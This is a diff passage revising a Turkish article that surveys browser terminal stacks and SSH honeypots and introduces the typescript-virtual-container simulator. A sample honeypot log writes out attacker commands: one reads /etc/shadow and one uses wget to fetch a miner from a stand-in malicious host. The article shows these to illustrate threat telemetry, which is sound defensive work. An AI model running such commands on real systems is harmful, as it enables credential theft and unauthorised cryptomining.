+Bu tabloda göze çarpan: `v86` hem npm paketi olan, hem tarayıcı ve Nodeda dönen hem açık kaynak tek emülatördür. "JavaScript içinde Linux emülatörleri" konuşmasına hâkim olmasının sebebi budur. Geri kalanın handikapı vardır: JSLinuxun APİsi yok, jor1k arşivli, CheerpX para tutar, WebContainers yalnızca tarayıcı ve Nodea özgü, container2wasm derleme adımı ve CLI gerektirir. Sadece "JavaScriptte Linux başlatmaya" ihtiyacın varsa `v86` neredeyse hep doğru başlangıç noktasıdır.
 
 ---
 
-## Bölüm 3 -- Terminal yığınları: xterm.js ve node-pty
+## Kısım 3: Terminal yığınları, xterm.js ve node-pty
 
-İki paket, insanlar shell benzeri deneyimler inşa ettiğinde sürekli karşımıza çıkar. Sandbox veya emülatör değiller -- UI ve PTY tesisatıdır -- ama o kadar bitişiktirler ki onları dışarıda bırakmak kötü hissettirirdi. Ayrıca ikisini de kullandım ve gerçekten iyiler.
+İki paket insanlar kabuk benzeri deneyimler inşa ederken sürekli döner. Bunlar kum havuzu ya da emülatör değildir: kullanıcı arayüzü ve PTY tesisatıdır: ama o kadar ilişkililer ki dışarıda bırakırsam içim rahat etmez. Ayrıca ikisini de kullandım ve gerçekten iyiler.
 
-### 3.1 `xterm.js` -- terminal renderlayıcısı
+### 3.1 `xterm.js`: terminal render
 
-xterm.js, tarayıcı için bir terminal emülatörüdür. Bir terminal ekranını (VT100/xterm kaçış dizileri) bir `<canvas>` öğesinde renderlar, klavye girdisini işler ve veri akışı için bir API sunar.
+xterm.js tarayıcı için terminal emülatörüdür. `<canvas>` öğesinde terminal ekranı (VT100/xterm kaçış dizileri) gösterir, klavye girdisini yönetir ve veri yönlendirmek için API sunar.
 
-Kullananlar: VS Code'un entegre terminali, Azure Cloud Shell, Proxmox VE, AWS CloudShell ve daha birçokları.
+Kullananlar: VS Code gömülü terminali, Azure Cloud Shell, Proxmox VE, AWS CloudShell ve daha niceleri.
 
 ```js
 import { Terminal } from "@xterm/xterm";
@@ -495,28 +495,28 @@ term.loadAddon(fitAddon);
 term.open(document.getElementById("terminal"));
 fitAddon.fit();
 
-// Terminale veri gönder (metin olarak renderlanır)
+// Terminale veri gönder (metin olarak gösterilir)
 term.write("$ ");
 term.onData(data => {
-  // data tuş vuruşlarıdır -- backend'ine gönder
+  // veri tuş vuruşlarıdır: backende gönder
   socket.send(data);
 });
 socket.onmessage(msg => {
-  // backend'den gelen çıktı -- görüntüle
+  // backend çıktısı: göster
   term.write(msg.data);
 });
 ```
 
-xterm.js sadece renderlama katmanıdır. Bir shell çalıştırmaz. Komutları yorumlamaz. Hangi backend'e bağlamak istersen ona bağladığın bir görüntü bileşenidir. Birçok kişi xterm.js'nin "terminali yaptığını" düşünür ama aslında sadece ekrandır -- yine de onu gerçekten komut çalıştıran bir şeye bağlaman gerekir.
+xterm.js yalnızca render katmanıdır. Kabuk çalıştırmaz. Komut yorumlamaz. Seçtiğin backende bağladığın görüntüleme widgetıdır. Birçok insan xterm.jsin "terminali yaptığı" sanır ama gerçekten sadece ekrandır: komutları gerçekten çalıştıran bir şeye bağlamak zorundasın.
 
-**npm**: [@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm)  
+**npm**: [@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm)
 **GitHub**: [xtermjs/xterm.js](https://github.com/xtermjs/xterm.js)
 
 ---
 
-### 3.2 `node-pty` -- PTY başlatma
+### 3.2 `node-pty`: PTY oluşturma
 
-`node-pty`, Node.js'de bir sahte terminal (PTY) başlatır ve ona bir okuma/yazma tanıtıcısı verir. xterm.js ile kullanıldığında, sunucuda çalışan gerçek bir shell (bash, zsh, fish) ile konuşan bir tarayıcı terminali inşa etmeni sağlar.
+`node-pty` Node.js içinde sözde terminal (PTY) yaratır ve üstünde okuma/yazma handleı verir. xterm.js ile kullanılınca sunucuda dönen gerçek kabuğa (bash, zsh, fish) konuşan tarayıcı terminali inşa etmeye izin verir.
 
 ```js
 import * as pty from "node-pty";
@@ -530,44 +530,44 @@ const shell = pty.spawn("bash", [], {
 });
 
 shell.onData(data => {
-  // WebSocket aracılığıyla tarayıcıdaki xterm.js'ye gönder
+  // WebSocket üzerinden tarayıcı xterm.jse gönder
   ws.send(data);
 });
 
 ws.on("message", data => {
-  // Tarayıcıdaki tuş vuruşlarını shell'e ilet
+  // Tarayıcı tuş vuruşlarını kabuğa ilet
   shell.write(data);
 });
 ```
 
-Bu, bulut IDE'leri ve web terminalleri için standart desendir: xterm.js (tarayıcı) ↔ WebSocket ↔ node-pty ↔ gerçek bash. İzolasyon yok. Shell, Node.js sürecinin tam izinleriyle çalışır.
+Bu bulut IDEler ve web terminalleri için standart şemadır: xterm.js (tarayıcı) ↔ WebSocket ↔ node-pty ↔ gerçek bash. İzolasyon hâlâ yoktur. Kabuk Node.js sürecinin (ya da onu çalıştıran kullanıcının) tüm izinleriyle çalışır.
 
-**Bakımcı**: Microsoft.  
-**npm**: [node-pty](https://www.npmjs.com/package/node-pty)  
+**Bakımını yapan**: Microsoft.
+**npm**: [node-pty](https://www.npmjs.com/package/node-pty)
 **GitHub**: [microsoft/node-pty](https://github.com/microsoft/node-pty)
 
 ---
 
-## Bölüm 4 -- SSH honeypot'ları
+## Kısım 4: SSH honeypotları
 
-Honeypot'lar saldırıya uğramak için tasarlanır. Amaç, saldırganların etkileşime girmesi için yeterince gerçek görünmek, aynı anda yaptıkları her şeyi tehdit istihbaratı için kaydetmektir. SSH birincil hedeftir çünkü internette en çok saldırıya uğrayan hizmettir -- genel bir IP'de 22. portu açarsan, dakikalar içinde otomatik tarama girişimleri göreceksin. Bir ara dene, ne kadar hızlı olduğu dehşet verici.
+Honeypotlar saldırıya uğramak için tasarlanır. Amaç saldırganların etkileşime girecek kadar gerçek görünmek ve tehdit istihbaratı için yaptıkları her şeyi kaydetmektir. SSH birincil hedeftir çünkü internette en çok saldırılan servistir: 22. portu herkese açık IPde sunarsan dakikalar içinde kelimenin tam anlamıyla otomatik tarama girişimleri görürsün. Bir gün dene, ne kadar hızlı geldiği epey korkutucudur.
 
-Bir honeypot'un kalitesi iki şeyle ölçülür: **sadakat** (gerçek bir sistemmiş gibi ne kadar inandırıcı olduğu) ve **telemetri** (ne kadar faydalı veri yakaladığı). Bunlar gerilim halindedir. Yüksek sadakatli bir honeypot inşa etmesi daha zor ve işletmesi daha risklidir.
+Honeypot kalitesi iki şeyle ölçülür: **sadakat** (gerçek sistemi ne kadar ikna edici taklit eder) ve **telemetri** (ne kadar faydalı veri yakalar). Bu ikisi gerilimlidir. Yüksek sadakatli honeypot inşa etmesi zor ve işletmesi risklidir.
 
-Bu bölüm, beni sonunda `typescript-virtual-container`'da `HoneyPot` modülünü inşa etmeye yönlendiren şeydir, bu yüzden burada bazı fikirlerim var.
+Bu bölüm beni sonunda `typescript-virtual-container` içinde `HoneyPot` modülünü inşa etmeye götüren şeydir, o yüzden burada birkaç fikrim var.
 
-### 4.1 Cowrie -- altın standart
+### 4.1 Cowrie: altın standart
 
-Cowrie, Python tabanlı orta-yüksek etkileşimli bir SSH ve Telnet honeypot'udur. Araştırma ve güvenlik topluluğunda en yaygın kullanılan SSH honeypot'udur.
+Cowrie Python tabanlı orta-yüksek etkileşimli SSH ve Telnet honeypottur. Araştırma ve güvenlik topluluğunda en çok dağıtılan SSH honeypottur.
 
 Mimari:
-- **Protokol katmanı**: gerçek SSH protokolü uygulaması (Twisted Conch), böylece saldırganlar gerçek el sıkışmalar, gerçek anahtar değişimi, gerçek kimlik doğrulama alır
-- **Shell katmanı**: sahte bir dosya sistemi (Debian 5.0'a benzeyen) ve yaygın komutlara yanıt veren kısmi bir shell yorumlayıcı
-- **Proxy modu**: arkasındaki gerçek bir sisteme yönlendirebilir (yüksek etkileşim modu), içinden geçen her şeyi kaydeder
-- **LLM modu** (yeni eklenen): nasıl işleyeceğini bilmediği komutlara dinamik yanıtlar üretmek için bir dil modeli kullanır -- evet, Cowrie'nin artık bir AI modu var. Çılgın zamanlar.
+- **Protokol katmanı**: gerçek SSH protokol uygulaması (Twisted Conch), o yüzden saldırganlar gerçek el sıkışma, gerçek anahtar değişimi, gerçek kimlik doğrulama alır
+- **Kabuk katmanı**: sahte dosya sistemi (Debian 5.0 benzeri) ve yaygın komutlara yanıt veren kısmi kabuk yorumlayıcı
+- **Vekil modu**: arkasında gerçek sisteme yönlendirebilir (yüksek etkileşim modu), geçen her şeyi kaydeder
+- **LLM modu** (yeni ekleme): işlemeyi bilmediği komutlara dinamik yanıt üretmek için dil modeli kullanır: evet, Cowrienin artık yapay zekâ modu vardır. Çılgın bir çağda yaşıyoruz.
 
 ```python
-# Cowrie'nin yakaladıkları
+# Cowrienin yakaladığı şey
 {
   "timestamp": "2024-01-15T03:22:11.847Z",
   "src_ip": "45.33.32.156",
@@ -585,76 +585,76 @@ Mimari:
 }
 ```
 
-Cowrie, kötü amaçlı yazılım analizi için indirilen dosyaları (wget/curl/SFTP/SCP aracılığıyla) kaydeder. Splunk, Elasticsearch ve diğer SIEM platformlarıyla entegre olur.
+Cowrie indirilen dosyaları (wget/curl/SFTP/SCP üzerinden) zararlı yazılım analizi için saklar. Splunk, Elasticsearch ve diğer SIEM platformlarıyla bütünleşir.
 
-**Sadakat**: orta-yüksek. Otomatik botları kandırmak için yeterince inandırıcı (SSH saldırganlarının %99'u -- çoğu sadece `root`/`password` deneyen aptal scriptlerdir). Ancak sofistike insanlar onu parmak iziyle tespit edebilir, genellikle oldukça hızlı.
+**Sadakat**: orta-yüksek. Otomatik botları kandıracak kadar ikna edici (SSH saldırganlarının %99u budur: çoğu `root`/`password` deneyen aptal scriptlerdir). Sofistike insanlar parmak iziyle tanımlayabilir ama genelde epey hızlıdır.
 
-**Dil**: Python (Twisted)  
+**Dil**: Python (Twisted)
 **GitHub**: [cowrie/cowrie](https://github.com/cowrie/cowrie)
 
 ---
 
-### 4.2 Kippo -- Cowrie'nin öncülü
+### 4.2 Kippo: Cowrie öncülü
 
-Kippo, Cowrie'nin dayandığı orijinal orta etkileşimli SSH honeypot'udur. Aynı temel fikir: gerçek SSH protokolü, sahte dosya sistemi, kısmi shell. Cowrie bu noktada onu tamamen geride bırakmıştır -- Kippo arşivlenmiştir ve 2026'da kimse onu çalıştırıyor olmamalıdır. Tamamen tarihsel bütünlük için bahsedilmiştir, eski blog yazılarında ve güvenlik makalelerinde referans verildiğini görebilirsin.
+Kippo, Cowrienin tabanlandığı orijinal orta etkileşimli SSH honeypottur. Aynı temel fikir: gerçek SSH protokolü, sahte dosya sistemi, kısmi kabuk. Cowrie bu noktada tamamen yerini aldı: Kippo arşivlendi ve 2026da kimse kullanmamalıdır. Sırf tarihsel eksiksizlik için anıldı çünkü eski blog yazıları ve güvenlik makalelerinde başvurulduğunu görebilirsin.
 
-**GitHub**: [desaster/kippo](https://github.com/desaster/kippo) -- arşivlenmiş
+**GitHub**: [desaster/kippo](https://github.com/desaster/kippo): arşivli
 
 ---
 
-### 4.3 endlessh -- SSH katran çukuru
+### 4.3 endlessh: SSH çukur madeni
 
-endlessh, dejenere bir honeypot'tur: SSH bağlantılarını, saniyede 1 bayt (veya daha yavaş) banner verisi damlatarak açık tutar. Ona bağlanan bir SSH istemcisi sonsuza kadar takılı kalır -- sunucu banner'ı göndermeyi bitirmediği için kimlik doğrulamaya asla geçemez.
+endlessh yozlaşmış bir honeypottur: SSH bağlantılarını banner verisini saniyede 1 bayt (ya da daha yavaş) yavaş yayınlayarak açık tutar. Ona bağlanan SSH istemcisi süresiz takılı kalır: sunucu banner göndermeyi hiç bitirmediği için kimlik doğrulamaya asla ulaşamaz.
 
-Amaç tehdit istihbaratı değil, saf kaynak reddidir: saldırgan tarayıcı thread'lerini meşgul ederek gerçek hedeflere daha hızlı vuramamalarını sağlamak. Dürüst olmak gerekirse, en iyi şekilde biraz kötücül. Saldırgandan hiçbir şey öğrenmiyorsun -- sadece zamanlarını boşa harcıyorsun. Bunun derin bir tatmini var.
+Amaç tehdit istihbaratı değil saf kaynak inkârıdır: saldırganların tarama threadlerini meşgul edip gerçek hedeflere o kadar hızlı ulaşamamalarını sağlamak. Dürüstçe iyi anlamda biraz şeytancadır. Saldırgandan hiçbir şey öğrenmezsin: sadece zamanını harcarsın. Bunda derinden tatmin edici bir şey vardır.
 
 ```c
-// endlessh'in tüm protokol davranışı:
-// Gönder: "SSH-2.0-OpenSSH_" sonra yavaşça rastgele karakterler ekle
+// endlesshin tüm protokol davranışı:
+// Gönder: "SSH-2.0-OpenSSH_" sonra yavaş rastgele karakter ekle
 // Bağlantıyı asla kapatma
-// Saldırgan tarayıcı N saniye sonra zaman aşımına uğrar
+// Saldırganın tarayıcısı N saniye sonra zaman aşımına uğrar
 ```
 
-Hiçbir komut yakalanmaz. Hiçbir kimlik doğrulama test edilmez. Sadece bağlantı süresi.
+Komut yakalanmaz. Kimlik doğrulama test edilmez. Sadece bağlantı süresi.
 
-**Yazıldığı dil**: C  
+**Yazıldığı dil**: C
 **GitHub**: [skeeto/endlessh](https://github.com/skeeto/endlessh)
 
 ---
 
-### 4.4 sshesame -- "herkesi içeri al" honeypot'u
+### 4.4 sshesame: "herkesi içeri al" honeypotu
 
-sshesame, her SSH bağlantısını kabul eder (herhangi bir kullanıcı adı, herhangi bir parola, herhangi bir anahtar) ve her şeyi kaydeder. Sıfır etkileşimli bir honeypot'tur: komutlara yanıt vermez, sadece saldırganları "içeri" alır ve yazdıkları her tuş vuruşunu kaydeder.
+sshesame tüm SSH bağlantılarını kabul eder (herhangi kullanıcı, herhangi parola, herhangi anahtar) ve her şeyi kaydeder. Sıfır etkileşimli honeypottur: komutlara yanıt vermez, saldırganların "girmesine" izin verip yazdıkları her tuş vuruşunu kaydeder.
 
 ```
-2024-01-15 03:22:11 45.33.32.156'dan bağlantı
-  Kullanıcı adı: root, Parola: password123 -- kabul edildi
+2024-01-15 03:22:11 45.33.32.156 bağlantısı
+  Kullanıcı: root, Parola: password123 -- kabul edildi
   Yazılan komutlar:
     cat /etc/shadow
     wget http://malicious.example/miner
     uname -a
-  47s sonra bağlantı kesildi
+  47 sn sonra bağlantı kesildi
 ```
 
-Kimlik bilgisi toplama için faydalıdır: botların denediği kullanıcı adlarını ve parolaları hızla biriktirirsin, bu da hangi varsayılan kimlik bilgilerinin şu anda aktif olarak kaba kuvvet saldırısına uğradığını söyler. Spoiler: her zaman `root`/`password`, `admin`/`admin` ve `root`/`123456`. Her seferinde.
+Kimlik bilgisi hasadı için faydalı: botların denediği kullanıcı adı ve parolaları hızla biriktirirsin, bu da hangi varsayılan kimlik bilgilerinin aktif kaba kuvvet altında olduğunu söyler. Spoiler: hep `root`/`password`, `admin`/`admin` ve `root`/`123456`tur. Her seferinde.
 
 **GitHub**: [jaksi/sshesame](https://github.com/jaksi/sshesame)
 
 ---
 
-### 4.5 Lyrebird -- Docker tabanlı honeypot framework'ü
+### 4.5 Lyrebird: Docker tabanlı honeypot çerçevesi
 
-`lyrebird/honeypot-base`, ağ hizmeti honeypot'ları inşa etmek için bir Docker temel imajıdır. Spesifik olarak bir SSH honeypot'u değildir -- herhangi bir protokol honeypot'u inşa etmek için bir framework'tür.
+`lyrebird/honeypot-base`, ağ servisi honeypotları inşa etmek için Docker taban imajıdır. Özellikle SSH honeypotu değildir: herhangi bir protokol için honeypot inşa etme çerçevesidir.
 
-Temel imaj, bir günlük kaydı framework'ü, protokoller için bir eklenti sistemi ve çoklu hizmet honeypot'ları için Docker Compose kurulumları sağlar. Belirli hizmetleri taklit etmek için genişletirsin.
+Taban imaj günlükleme çerçevesi, protokoller için eklenti sistemi ve çok servisli honeypotlar için Docker Compose yapılandırmaları sağlar. Belirli servisleri simüle etmek için genişletirsin.
 
 **Docker Hub**: [lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)
 
 ---
 
-### 4.6 Node.js'de bir SSH honeypot'u inşa etmek -- saf yol ve neden başarısız olduğu
+### 4.6 Node.js içinde SSH honeypotu inşa etmek: naif yöntem ve neden başarısız olur
 
-`typescript-virtual-container`'dan önce, Node.js'de bir SSH honeypot'u inşa etmek, gerçek `ssh2` kütüphanesini manuel komut taklitçiliğiyle birleştirmek anlamına geliyordu. Çok sıkıcı, çok eksik, ama yani... bu noktada bir geçiş ayini:
+`typescript-virtual-container` öncesinde Node.js içinde SSH honeypotu inşa etmek gerçek `ssh2` kütüphanesini manuel komut simülasyonuyla birleştirmek demekti. Çok sıkıcı, çok eksik ama... bu aşamada geçilmesi gereken yol:
 
 ```js
 import { Server } from "ssh2";
@@ -665,7 +665,7 @@ const hostKey = readFileSync("./host.key");
 
 new Server({ hostKeys: [hostKey] }, client => {
   client.on("authentication", ctx => {
-    // Girişimi günlüğe kaydet
+    // Girişimi kaydet
     appendFileSync("creds.log", `${ctx.username}:${ctx.credentials?.password}\n`);
     ctx.accept(); // Herkesi içeri al
   });
@@ -680,7 +680,7 @@ new Server({ hostKeys: [hostKey] }, client => {
         stream.on("data", data => {
           const cmd = data.toString().trim();
           appendFileSync("commands.log", `${cmd}\n`);
-          // Sahte yanıt
+          // Simüle yanıt
           if (cmd === "uname -a") {
             stream.write("\r\nLinux ubuntu 5.15.0-91-generic #101-Ubuntu x86_64 GNU/Linux\r\n");
           } else {
@@ -694,64 +694,64 @@ new Server({ hostKeys: [hostKey] }, client => {
 }).listen(2222);
 ```
 
-Bu, kimlik bilgilerini ve komutları yakaladığı anlamında "çalışır". Ancak sofistike bir saldırgan ona dokunduğu an bariz bir şekilde sahtedir. `uname -a`'nın doğru dizeyi döndürmesi ama `ls /etc`'nin "command not found" döndürmesi bir işarettir. Dosya sistemi yoktur. Komutlar zincirlemez. Borular çalışmaz. Değişkenler genişlemez.
+Bu kimlik bilgilerini ve komutları yakalaması anlamında "işe yarar". Ama sofistike saldırgan biraz kazınca bariz sahtedir. `uname -a` doğru dizeyi döndürür ama `ls /etc` "command not found" döndürür: buram buram tuzak kokar. Dosya sistemi yoktur. Komutlar zincirlenmez. Pipelar çalışmaz. Değişkenler genişlemez.
 
-Yetenekli bir saldırgan, honeypot'unu ilk beş komutta parmak iziyle tespit eder. Cowrie benzeri davranışları kontrol eden otomatik scriptler de onu hemen tespit edecektir. Görünüşe göre, `typescript-virtual-container` yazarını komutları gerçekten yorumlayan bir şey inşa etmeye iten şey buydu -- Bölüm 5'te daha fazlası.
+Yetkin saldırgan honeypotunu ilk beş komutta tanımlar. Cowrie benzeri davranış arayan otomatik scriptler de hemen tespit eder. Görünüşe göre `typescript-virtual-container` yazarını komutları gerçekten yorumlayan bir şey inşa etmeye iten budur: bu konuda Kısım 5te daha fazla.
 
 ---
 
-### Honeypot ailesi özeti
+### Honeypot ailesinin özeti
 
-| | Cowrie | Kippo | endlessh | sshesame | Lyrebird | Saf ssh2 |
+| | Cowrie | Kippo | endlessh | sshesame | Lyrebird | Naif ssh2 |
 |---|---|---|---|---|---|---|
-| **Etkileşim seviyesi** | orta-yüksek | orta | sıfır | sıfır | değişir | düşük |
-| **Gerçek SSH protokolü** | ✅ | ✅ | ❌ (tarpit) | ✅ | değişir | ✅ |
-| **Shell sadakati** | orta | orta | yok | yok | değişir | minimal |
-| **Kimlik bilgisi yakalar** | ✅ | ✅ | ❌ | ✅ | ✅ | ✅ |
-| **Komut yakalar** | ✅ | ✅ | ❌ | ✅ | değişir | ✅ |
-| **Kötü amaçlı yazılım yakalar** | ✅ | ✅ | ❌ | ❌ | ❌ | ❌ |
+| **Etkileşim seviyesi** | orta-yüksek | orta | sıfır | sıfır | değişken | düşük |
+| **Gerçek SSH protokolü** | ✅ | ✅ | ❌ (çukur) | ✅ | değişken | ✅ |
+| **Kabuk sadakati** | orta | orta | uygulanamaz | hiç | değişken | minimal |
+| **Kimlik bilgilerini yakalar** | ✅ | ✅ | ❌ | ✅ | ✅ | ✅ |
+| **Komutları yakalar** | ✅ | ✅ | ❌ | ✅ | değişken | ✅ |
+| **Zararlıları yakalar** | ✅ | ✅ | ❌ | ❌ | ❌ | ❌ |
 | **SIEM entegrasyonu** | ✅ yerel | ❌ | ❌ | ❌ | ❌ | manuel |
 | **LLM yanıtları** | ✅ (yeni) | ❌ | ❌ | ❌ | ❌ | ❌ |
 | **Dil** | Python | Python | C | Go | Docker | Node.js |
-| **Node.js yerel** | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
-| **Durum** | ✅ çok aktif | ⚠️ arşivlenmiş | ✅ aktif | ✅ aktif | ✅ aktif | DIY |
+| **Yerel Node.js** | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
+| **Durum** | ✅ çok aktif | ⚠️ arşivli | ✅ aktif | ✅ aktif | ✅ aktif | Kendin yap |
 
-Buradaki desen oldukça net: ne kadar çok sadakat istersen, o kadar çok Python yazman gerekir. Bunu ciddi yapıyorsan Cowrie açık ara kazanandır -- yıllardır savaşta test edilmiştir ve sadece kimlik bilgilerinden çok daha fazlasını yakalar. endlessh ve sshesame, ciddi tehdit istihbarat araçlarından çok eğlenceli yan projelerdir. Ve saf Node.js yaklaşımı, bir duvara çarpmadan önce yolun belki %20'sine kadar götürür.
+Buradaki desen epey nettir: sadakat istedikçe Python yazmak gerekir. Ciddi yapıyorsan Cowrie tartışmasız kazanan: sahada yıllarca sınandı ve basit kimlik bilgilerinden çok fazlasını yakalar. endlessh ve sshesame ciddi tehdit istihbaratı araçlarından çok hoş projelerdir. Ve Node.js naif yaklaşımı duvara çarpmadan önce belki yolun %20sine götürür.
 
 ---
 
-## Bölüm 5 -- `typescript-virtual-container`: boşluğu dolduran şey
+## Kısım 5: `typescript-virtual-container`, boşluğu dolduran
 
-Tamam, işte işlerin ilginçleştiği yer. Yukarıdaki tüm aileleri katalogladıktan sonra, eksik çeyrek oldukça bariz hale geliyor:
+Tamam işte işler ilginçleşir. Yukarıdaki tüm aileleri katalogladıktan sonra eksik çeyrek epey belli olur:
 
-- JS sandbox'ları: kodu izole eder, shell yok, dosya sistemi yok, SSH yok
-- Linux emülatörleri: gerçek işletim sistemi, gerçek shell, gerçek SSH... ama 150+ MB RAM, 30 saniyelik başlatma ve seri G/Ç üzerine kendi API'ni inşa etmen gerekiyor
-- Honeypot'lar: sahte shell, programatik API yok, Python/Go/C, Node-yerel değil
+- JS kum havuzları: kodu izole eder, kabuk yok, dosya sistemi yok, SSH yok
+- Linux emülatörleri: gerçek işletim sistemi, gerçek kabuk, gerçek SSH... ama 150+ MB RAM, 30 saniye başlatma ve seri G/Ç üstüne kendi APIni inşa etmen gerekir
+- Honeypotlar: sahte kabuk, programlanabilir API yok, Python/Go/C, yerel Node değil
 
-Kimse eksiksiz, programatik, Node-yerel bir Linux ortamını gerçek SSH, gerçek izinler, gerçek sanal ağ ve tipli bir TypeScript API ile inşa etmemişti. O yüzden o inşa etti.
+Kimse gerçek SSHli, gerçek izinli, gerçek sanal ağlı, tipli TypeScript APIli tam programlanabilir yerel Node Linux ortamı inşa etmemişti. O inşa etti.
 
-Hızlı tanıtım -- ondan ilk kez düzgün bir şekilde bahsediyorum: `typescript-virtual-container`, çevrimiçi olarak **Fortune** (veya ItsRealFortune) olarak bilinen Fransız geliştirici [Chloé Rolzhausen](https://itsrealfortune.fr) tarafından inşa edildi. Onu [web sitesinde](https://itsrealfortune.fr) ve [LinkedIn'de](https://www.linkedin.com/in/chlo%C3%A9-rolzhausen-1b0439316//) bulabilirsin. Tüm proje -- 56 bin satır TypeScript, 247 dosya, 170 komut -- tek bir kişinin solo çabasıydı. Makalenin geri kalanında ona Fortune diyeceğim. Ve evet, oldukça çılgınca. Git bak!
+Kısa tanıtım çünkü ilk kez düzgün andığım yerdir: `typescript-virtual-container`, çevrimiçi **Fortune** (ya da ItsRealFortune) diyen Fransız geliştirici [Chloé Rolzhausen](https://itsrealfortune.fr) tarafından inşa edildi. Onu [web sitesinde](https://itsrealfortune.fr) ve [LinkedIn](https://www.linkedin.com/in/chlo%C3%A9-rolzhausen-1b0439316/) üzerinde bulabilirsin. Tüm proje: 56.000 satır TypeScript, 247 dosya, 170 komut, tek kişinin solo emeğiydi. Makalenin geri kalanında ona Fortune diyeceğim. Ve evet, epey çılgınca. İşi gözden geçir!
 
-### Gerçekte ne olduğu
+### Gerçekte nedir
 
-`typescript-virtual-container`, saf TypeScript ile yazılmış bir **Linux ortamı simülatörüdür**. Wasm yok. Yerel eklenti yok. Çekirdek yok. 247 TypeScript dosyası boyunca ~56.000 satır kaynak.
+`typescript-virtual-container`, saf TypeScript yazılmış **Linux ortam simülatörüdür**. Wasm yok, yerel uzantı yok, çekirdek yok. 247 TypeScript dosyasına dağılmış ~56.000 satır kaynak.
 
-Temel içgörü: `ls /etc | grep passwd` çalıştırmak için bir CPU emülatörüne ihtiyacın yok. İhtiyacın olan:
-1. Yol işlemlerine yanıt veren bellek içi bir düğüm ağacı
-2. Her erişimde uygulanan bir POSIX izin modeli
-3. Pipeline'ları, yönlendirmeleri, alt shell'leri ve değişken genişletmeyi anlayan bir shell ayrıştırıcısı
-4. ~170 komut uygulaması (fonksiyonlar, ikili dosyalar değil)
-5. Bir kullanıcı ve grup yönetim sistemi
-6. Tüm bunları SSH üzerinden sunacak bir şey
+Kilit içgörü: `ls /etc | grep passwd` çalıştırmak için CPU emülatörüne ihtiyacın yoktur. İhtiyacın:
+1. Yol işlemlerine yanıt veren bellekte düğüm ağacı
+2. Her erişimde uygulanan POSIX izin modeli
+3. Pipeları, yönlendirmeleri, alt kabukları ve değişken genişletmeyi anlayan kabuk sözdizimi ayrıştırıcısı
+4. ~170 komut uygulaması (fonksiyonlar, ikililer değil)
+5. Kullanıcı ve grup yönetim sistemi
+6. Bütün bunları SSH üzerinden sunacak bir şey
 
-Tüm bunlar, çekirdek katılımı olmadan saf TypeScript'te başarılabilir.
+Bunların hepsi çekirdek karışmadan saf TypeScriptte yapılabilir.
 
 ### VirtualFileSystem
 
-VFS, tipli düğümlerden oluşan bellek içi bir ağaçtır -- açıkça `"fs"` kalıcılık modunu etkinleştirmediğin sürece disk G/Ç yoktur:
+VFS, tipli düğümlerin bellekte ağacıdır: `"fs"` kalıcılık modu açıkça etkinleştirilmedikçe disk G/Ç yok:
 
 ```ts
-// Basitleştirilmiş iç temsil
+// Basitleştirilmiş dahili temsil
 type InternalNode =
   | { type: "file"; content: string | Uint8Array; mode: number; uid: number; gid: number; mtime: number }
   | { type: "dir"; children: Map<string, InternalNode>; mode: number; uid: number; gid: number }
@@ -760,24 +760,24 @@ type InternalNode =
   | { type: "stub" }; // tembel yüklenen yer tutucu
 ```
 
-Her yol işlemi `normalizePath` (`.`, `..`, sembolik bağları çözer) ve `enforceAccess` (istekte bulunan uid/gid'e karşı okuma/yazma/çalıştırma iznini kontrol eder) üzerinden geçer. `chmod`, `chown`, sticky bit'ler ve setuid'in hepsi uygulanmıştır ve gerçekten uygulanır. uid 1000 olarak çalışan bir süreç, root'a ait 0600 modundaki bir dosyayı okumaya çalışırsa EACCES alır -- sahte bir EACCES değil, izin kontrolünden fırlatılan gerçek bir JavaScript `Error`'ı. Bu kısım oldukça zarif, dürüst olmak gerekirse.
+Her yol işlemi `normalizePath` (`.`, `..`, sembolik bağları çözer) ve `enforceAccess` (isteyen uid/gidye karşı okuma/yazma/çalıştırma izinlerini doğrular) üzerinden geçer. `chmod`, `chown`, yapışkan bitler ve setuid hepsi uygulanır ve gerçekten uygulanır. uid 1000 ile dönen süreç kip 0600 root dosyasını okumaya çalışırsa EACCES alır: sahte EACCES değil, izin kontrolünden fırlatılan gerçek JavaScript `Error`. Bu kısım dürüstçe epey zariftir.
 
-VFS şunlara serileştirilir:
-- `.vfsb` -- kompakt bir ikili format (özel, fflate sıkıştırmalı) -- bu varsayılandır
-- JSON snapshot'ı -- insan tarafından okunabilir, hata ayıklama için iyi
-- TAR arşivi -- gerçek tar formatıyla içe/dışa aktarma, böylece `tar -xf` bir şey yapabilirsin ve VFS... o dosyalara sahip olur
-- SquashFS imajı -- salt okunur içe aktarma
+VFS şuna serileşir:
+- `.vfsb`: kompakt ikili format (fflate sıkıştırmalı özel): varsayılan format budur
+- JSON anlık görüntüsü: insanca okunur, hata ayıklamaya iyi
+- TAR arşivi: gerçek tar formatıyla içe/dışa aktarma, yani bir şeyi `tar -xf` edebilirsin ve VFS sadece... o dosyalara sahiptir
+- SquashFS imajı: salt okunur içe aktarma
 
-`"fs"` kalıcılık modunda, çökme kurtarma için bir yazma-önde günlüğü (WAL) tutar -- yazmalar önce günlüğe gider, ardından temizleme sırasında snapshot'a. Node işlemin yarıda çökerse, günlük son tam durumu yeniden yapılandırmana izin verir.
+`"fs"` kalıcılık modunda çökmeden kurtarma için yazmadan önce günlüğü (WAL) tutar: yazmalar önce günlüğe, sonra flush sırasında anlık görüntüye gider. Node işlemin ortasında çökerse günlük son eksiksiz durumu yeniden kurmaya izin verir.
 
-Ayrıca disk G/Ç gecikmesini simüle eden bir `FileCache` katmanı vardır. `NVME_DISK_IO` veya `HDD_DISK_IO` gibi profiller yapılandırabilirsin ve VFS, gerçekçi zamanlamaları eşleştirmek için dosya işlemlerini yapay olarak geciktirir. Ki bu biraz komik -- yazılımın donanımı simüle etmek için kendini kasıtlı olarak yavaşlatması -- ama aslında kıyaslama için çok kullanışlı.
+Disk G/Ç gecikmesini simüle eden `FileCache` katmanı da vardır. `NVME_DISK_IO` ya da `HDD_DISK_IO` gibi profiller yapılandırırsın ve VFS gerçekçi zamanlamalara uymak için dosya işlemlerini yapay geciktirir. Bu epey komiktir: donanımı simüle etmek için kendini bilinçli yavaşlatan yazılım: ama kıyaslama için aslında çok faydalıdır.
 
-### Shell yorumlayıcı
+### Kabuk yorumlayıcı
 
-Shell ayrıştırıcısı tipli bir AST üretir:
